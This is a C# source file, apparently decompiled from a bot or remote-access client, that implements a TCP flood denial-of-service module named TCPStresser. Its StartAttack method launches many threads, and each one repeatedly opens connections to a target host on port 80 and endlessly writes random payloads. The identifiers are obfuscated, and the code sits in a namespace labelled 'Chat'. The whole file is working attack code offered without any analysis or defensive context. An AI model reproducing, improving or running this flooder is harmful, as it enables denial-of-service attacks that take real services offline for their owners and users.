namespace Chat
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Net.Sockets;
    using System.Text;
    using System.Threading;

    public class TCPStresser
    {
        public static bool Alive;
        public static int jThre;
        private static NetworkStream M9B1zLn9BDdvE3Thuyi19R73iy78TwqB;
        public static int Size;
        public static string URLS;
        private static TcpClient X4vKz5OoJbKNFDQzWLOSzJSMssRvhpHV = new TcpClient();

        public static void StartAttack()
        {
            if (!Alive)
            {
                Alive = true;
                int jThre = TCPStresser.jThre;
                for (int i = 0; i <= jThre; i++)
                {
                    new Thread(new ThreadStart(TCPStresser.zv42dzCzO7gGe7lUCv2faCkDakWk6OQF)).Start();
                }
            }
        }

        public static void StopAttack()
        {
            if (Alive)
            {
                Alive = false;
            }
        }

        public static void zv42dzCzO7gGe7lUCv2faCkDakWk6OQF()
        {
            try
            {
                while (Alive)
                {
                    X4vKz5OoJbKNFDQzWLOSzJSMssRvhpHV = new TcpClient(URLS, 80);
                    M9B1zLn9BDdvE3Thuyi19R73iy78TwqB = X4vKz5OoJbKNFDQzWLOSzJSMssRvhpHV.GetStream();
                    StringBuilder builder = new StringBuilder("");
                    char[] chArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
                    int size = Size;
                    for (int i = 1; i <= size; i++)
                    {
                        VBMath.Randomize();
                        int index = (int) Math.Round((double) (Conversion.Int((float) ((((chArray.Length - 2) - 0) + 1) * VBMath.Rnd())) + 1f));
                        builder.Append(chArray[index]);
                    }
                    while (true)
                    {
                        if (X4vKz5OoJbKNFDQzWLOSzJSMssRvhpHV.Connected)
                        {
                            M9B1zLn9BDdvE3Thuyi19R73iy78TwqB.Write(Encoding.UTF8.GetBytes(builder.ToString()), 0, Encoding.UTF8.GetBytes(builder.ToString()).Length);
                        }
                    }
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            Thread.CurrentThread.Abort();
        }
    }
}

